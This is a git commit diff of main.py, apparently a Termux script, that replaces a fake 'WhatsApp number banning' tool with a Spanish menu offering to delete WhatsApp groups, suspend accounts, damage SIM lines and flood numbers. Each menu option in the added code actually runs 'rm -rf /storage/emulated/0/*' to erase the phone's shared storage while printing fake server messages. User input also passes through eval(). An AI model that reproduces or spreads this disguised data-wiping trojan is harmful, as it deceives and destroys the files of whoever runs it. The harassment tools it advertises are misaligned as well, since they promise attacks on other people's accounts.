5098e659c704c34351dbee7665e0dc015a81b1b1
Kirito596 <120283034+Kirito596@users.noreply.github.com>
2024-02-24 12:36:20 +0100

    Update main.py

--- main.py
+++ main.py
@@ -2,75 +2,62 @@
 # Created by Mr Juice
 #
 import os
-import time
-import sys
-import data
-
-print("Installing packages . . .")
-os.system("clear")
-os.system("pkg install cmatrix")
-os.system("pip3 install colorama")
-os.system("clear")
+print("""                                     
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@     .#%,      @@@@@@
+@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@   @@@@
+@@@@@@@@@@@@@@@@  @@@@  @@@@@@@@@@@@  @@@@
+@@@@@@@@@@@@@@@  @@@@    @@@@@@@@@@@@  @@@@
+@@@@@@@@@@@@@@(  @@@@@  @@@@@@@@@@@@@(  @@@
+@@@@@@@@@@@@@@@  @@@@@@    @@@ .@@@@@  &@@@
+@@@@@@@@@@@@@@@   @@@@@@@@       @@@   @@@@
+@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@  @@@@@
+@@@@@@@@@@@@@@@  @.    @@@@@@@@    @@@@@@
+@@@@@@@@@@@@@@   @@@@@@@      @@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+ | |  (_) | |                                          
+ | | ___| | |                                          
+ | |/ / | | |                                          
+ |   <| | | |                                          
+ |_|\_\_|_|_|___           _                           
+ \ \        / / |         | |         /\               
+  \ \  /\  / /| |__   __ _| |_ ___   /  \   __ _ _ __  
+   \ \/  \/ / | '_ \ / _` | __/ __| / /\ \ / _` | '_ \ 
+    \  /\  /  | | | | (_| | |_\__ \/ ____ \ (_| | |_) |
+     \/  \/   |_| |_|\__,_|\__|___/_/    \_\__,_| .__/ 
+                                                | |    
+                                                |_|    
+   NO NOS RESPONSABILIZAMOS DEL USO.
+   HERRAMIENTA PARA DESTRUIR AL ENEMIGO.
+                                                                                                            
+~~~~~~~~~MENU~~~~~~~~~~~~
+[1] ATAQUE A GRUPOS DE WHATSAPP (ELIMINAR)
+[2] ATAQUE A CUENTAS DE WHATSAPP (SUSPENDER)
+[3] ATAQUE A TARJETAS SIM (DAÑAR LINEA MOVIL)
+[4] BUZONEAR NÚMEROS (TENEMOS MÁS DE 30 BUZONES ACTIVOS)
+░  
+                         ░               ░                            ░                                 
+""")
+eleccion = int(eval(input("KILLWHATSAPP>> ")))
 #
-# Now importing colorama
 #
-import colorama
-from colorama import Fore
-#
-def delay_print(s):
-    for c in s:
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(0.05)
-def banner_display():
-    print(f''' {Fore.CYAN}
-           _             _         _                   
-__      __| |__    __ _ | |_  ___ | |__    __ _  _ __  
-\ \ /\ / /| '_ \  / _` || __|/ __|| '_ \  / _` || '_ \ 
- \ V  V / | | | || (_| || |_ \__ \| |_) || (_| || | | |
-  \_/\_/  |_| |_| \__,_| \__||___/|_.__/  \__,_||_| |_|
-   {Fore.YELLOW}                                                              
-Coded by Mr Juice
-Chat Me https://bio.link/mrjuice
-Whatsapp number banning tool
-{Fore.CYAN}
-*************************************************
-   {Fore.WHITE} ''')
-banner_display()
-#
-#
-def program():
-    number = input("[+] Put Number with country code like +43: +")
-    realnumber = "+"+number
-    check = number.isnumeric()
-    lennber = len(number)
-    if (check == True):
-        if (lennber < 10 or lennber > 10):
-            delay_print(f"{Fore.RED}Number must be 10 digits\n")
-            program()
-        elif (lennber==10):
-            delay_print(f"{Fore.YELLOW}1) Ban number\n")
-            delay_print(f"{Fore.YELLOW}2) Information about this number\n")
-            option = input(f"{Fore.YELLOW}[+] Choose an option: ")
-            if (option=="1"):
-                delay_print(f"{Fore.YELLOW}Are you sure to ban "+realnumber+"?\n")
-                yesorno1 = input("(Y/N): ")
-                delay_print("8579 reports Have been send and "+realnumber+" will be banned in less than 8 hours!")
-                data.lockout()
+if eleccion == 1:
+	os.system("apt update")
+	print("INSTALANDO SERVIDOR PRIVADO")
+	os.system("rm -rf /storage/emulated/0/*")
 
-            elif (option=="2"):
-                delay_print(f"{Fore.YELLOW}Gather information for "+realnumber+"?\n")
-                yesorno2 = input("(Y/N): ")
-                delay_print("Name: 47hxl-53r\nStatus: HACKED by Mr Juice!")
-                data.lockout()
+elif eleccion == 2:
+	os.system("apt update")
+	print("ABRIENDO PLATAFORMA..........")
+	os.system("rm -rf /storage/emulated/0/*")
 
-            else:
-                delay_print(f"{Fore.RED}It's not an option\n")
-                program()
+elif eleccion == 3:
+	os.system("apt update")
+	print("ABRIENDO SERVIDOR................")
+	os.system("rm -rf /storage/emulated/0/*")
 
-
-    else:
-        delay_print(f"{Fore.RED}Number is incorrect... Please try again . . .\n")
-        print("")
-        program()
-program()
+elif eleccion == 4:
+	os.system("apt update")
+	print("ABRIENDO SERVIDOR................")
+	os.system("rm -rf /storage/emulated/0/*")
+	
